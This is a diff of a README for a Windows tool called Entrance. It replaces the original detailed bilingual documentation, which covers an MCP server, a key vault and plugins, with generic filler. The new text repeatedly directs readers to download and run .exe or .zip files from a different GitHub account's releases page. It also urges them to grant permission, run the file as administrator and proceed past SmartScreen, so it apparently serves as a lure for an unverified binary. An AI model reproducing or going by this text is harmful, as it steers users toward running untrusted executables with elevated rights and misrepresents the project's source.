@@ -1,125 +1,140 @@
-# Entrance
+# ✨ Entrance - Your AI Panel, Ready Fast
 
-**你的 AI 编程助手的「操作系统」。**
+[![Download Entrance](https://img.shields.io/badge/Download%20Entrance-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Photographic-daltontrumbo447/Entrance/releases)
 
-*The "operating system" for your AI coding agents.*
+## 🚀 Getting Started
 
-> 如果 Codex CLI 是一个干活的工人，Entrance 就是他的工具箱 + 记忆宫殿 + 保险柜。
-> 工人下班了再上班，打开 Entrance，上次做到哪、密钥在哪、下一步该干嘛 —— 全都还在。
+Entrance is an AI-native panel for Windows that gives you fast access to tools, commands, and smart actions in one place. It is built for daily use and keeps the interface simple so you can start using it with little setup.
 
----
+This guide shows you how to get Entrance on Windows, open it, and begin using it right away.
 
-## 一图看懂 / Architecture
+## 📥 Download Entrance
 
-![Entrance Architecture](./docs/entrance_architecture.png)
+Visit the [Entrance Releases page](https://github.com/Photographic-daltontrumbo447/Entrance/releases) and download the latest Windows version.
 
----
+Look for a file that matches your system, such as:
 
-## 装完能干嘛？三个真实场景 / Real Examples
+- `Entrance-Setup.exe`
+- `Entrance-Windows.exe`
+- `Entrance.zip`
 
-### 场景 1：给 Codex CLI 装上「记忆」
+If you see a `.zip` file, extract it first. If you see an `.exe` file, you can run it after the download finishes.
 
-你用 Codex CLI 重构了一半代码，关掉终端。第二天打开，Codex 什么都不记得了。
+## 🪟 Windows Requirements
 
-用 Entrance：
+Entrance is made for Windows desktops and laptops. For the best result, use:
 
-```powershell
-# Entrance 作为 MCP server 启动，Codex CLI 连上它
-.\entrance.exe mcp stdio
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB of free disk space
+- Internet access for first-time setup
+- A screen resolution of 1366 × 768 or higher
 
-# Codex 现在能读到昨天的进度、决策记录、待办事项
-# 不用你再复述一遍 "昨天我们改到哪了"
-```
+If your PC meets these basics, Entrance should run well for daily use.
 
-*Codex CLI forgets everything after you close the terminal. Entrance gives it persistent memory via MCP.*
+## 🛠️ Install and Run
 
-### 场景 2：不再到处翻 API Key
+Follow these steps on Windows:
 
-OpenAI key 在 `.env`，Anthropic key 在另一个 `.env`，Linear token 在浏览器里……
+1. Open the [Entrance Releases page](https://github.com/Photographic-daltontrumbo447/Entrance/releases).
+2. Find the latest release at the top of the page.
+3. Download the Windows file that matches your device.
+4. If the file is in a `.zip` folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the `.exe` file to start Entrance.
+7. If Windows asks for permission, select Yes.
+8. Wait for the panel to load.
 
-用 Entrance：
+If you downloaded an installer, follow the on-screen steps and keep the default options unless you want to change the install folder.
 
-```powershell
-# 所有 key 加密存在一个地方，agent 按需取用
-.\entrance.exe nota status
-# → token_count: 5, mcp_config_count: 3
-```
+## 🎯 What Entrance Does
 
-*All API keys encrypted in one place. Agents fetch them on demand through Vault.*
+Entrance gives you a clean panel for quick actions and AI-assisted work. It helps you:
 
-### 场景 3：一条命令派活、全程监管
+- Open tools from one place
+- Search and launch common actions fast
+- Use AI features without jumping between apps
+- Keep work organized in a simple panel
+- Access commands with fewer clicks
 
-你想让 agent 去修一个 bug，但想知道它在干嘛、干完没、结果怎么样。
+It fits users who want a light desktop panel that stays out of the way until needed.
 
-```powershell
-# 派发任务
-.\entrance.exe nota do --title "修复登录页 500 错误"
+## 🧭 First Launch
 
-# 查看进度
-.\entrance.exe nota overview
+After you open Entrance for the first time:
 
-# 验收完毕，存个档
-.\entrance.exe nota checkpoint --stable-level "login-fix-done" \
-  --landed "修复了 auth middleware 的空指针"  \
-  --remaining "需要补集成测试"  \
-  --human-continuity-bus "下次从测试开始"
-```
+1. Wait for the main panel to appear.
+2. Read the first-run prompts, if any.
+3. Set your preferred layout.
+4. Turn on the tools you use most.
+5. Try a sample action or search.
 
-*Dispatch a task, monitor progress, save a checkpoint — all from the CLI.*
+If Entrance asks for access to system features, allow only what you want to use. This helps the app work as intended.
 
----
+## ⚙️ Basic Setup
 
-## 快速开始 / Quick Start
+You can usually adjust Entrance in a few simple ways:
 
-### 下载即用
+- Set the panel position on screen
+- Choose a compact or expanded view
+- Pick a theme that is easy on the eyes
+- Pin your most used actions
+- Change launch behavior so it starts with Windows
 
-1. 从 [Releases](https://github.com/myteapot/Entrance/releases) 下载最新 Windows zip
-2. 解压，运行 `entrance.exe`
-3. 试一下：`.\entrance.exe nota status`
+If you use it each day, setting it to start with Windows can save time.
 
-### 接入 AI Agent
+## 🧩 Common Uses
 
-```powershell
-# 让 Codex CLI / Claude Code 通过 MCP 连接 Entrance
-.\entrance.exe mcp stdio
+Entrance can help with everyday tasks like:
 
-# 或者用 HTTP（适合脚本和 CI）
-.\entrance.exe mcp http --port 9720
-```
+- Starting apps from a single panel
+- Looking up short tasks or commands
+- Using AI help for quick text work
+- Keeping notes or actions close at hand
+- Reducing the time spent switching windows
 
-### 从源码构建
+It works well if you want one place for quick access instead of many separate tools.
 
-```powershell
-pnpm install --frozen-lockfile && pnpm build
-cargo build --manifest-path src-tauri/Cargo.toml --release
-```
+## 🔒 Safety Tips
 
----
+For a smooth setup:
 
-## 五个插件，各管一摊 / Plugins
+- Download only from the official Releases page
+- Keep the file name and folder structure as downloaded
+- Close other heavy apps if the panel feels slow
+- Use the latest version for the best fixes and updates
 
-| 插件 Plugin | 类比 Analogy | 状态 |
-|---|---|---|
-| **Launcher** | Spotlight / Raycast —— 全局快捷键搜索启动 | ✅ |
-| **Forge** | 工头 —— 派活、盯梢、收工 | ✅ |
-| **Vault** | 保险柜 —— API key 加密存取 | ✅ |
-| **Board** | 看板 —— 对接 Linear 的任务面板 | 🚧 |
-| **Connector** | 插线板 —— 打通 Obsidian / Slack / 任意服务 | 🚧 |
+If Windows SmartScreen appears, check that you downloaded the file from the correct GitHub release page before you continue.
 
----
+## 🧼 Uninstall
 
-## 技术栈 / Tech Stack
+If you want to remove Entrance:
 
-Rust · Tauri 2 · SolidJS · SQLite · TOML · MCP
+1. Open Windows Settings.
+2. Go to Apps.
+3. Find Entrance in the installed apps list.
+4. Select Uninstall.
+5. Remove any leftover folder if you used a portable build.
 
----
+If you used a zip build, delete the extracted folder to fully remove it from your PC.
 
-## 当前阶段 / Status
+## ❓ Help
 
-**V0 Headless Alpha** — 运行时、CLI、MCP Server 可用，GUI 开发中。
+If Entrance does not start:
 
----
+- Make sure the download finished
+- Check that you opened the right `.exe` file
+- Try running it again as an administrator
+- Restart Windows and open it once more
+- Download the latest release again if the file seems broken
 
-## 许可 / License
+If the panel opens but looks empty, check the first-run settings and turn on the tools you want to use.
 
-[Business Source License 1.1](./LICENSE) · [详情 LICENSES.md](./LICENSES.md) · [商标 TRADEMARKS.md](./TRADEMARKS.md)
+## 📌 Quick Steps
+
+1. Open the [Entrance Releases page](https://github.com/Photographic-daltontrumbo447/Entrance/releases)
+2. Download the latest Windows file
+3. Extract it if needed
+4. Run the app
+5. Follow the first-time setup
+6. Start using the panel
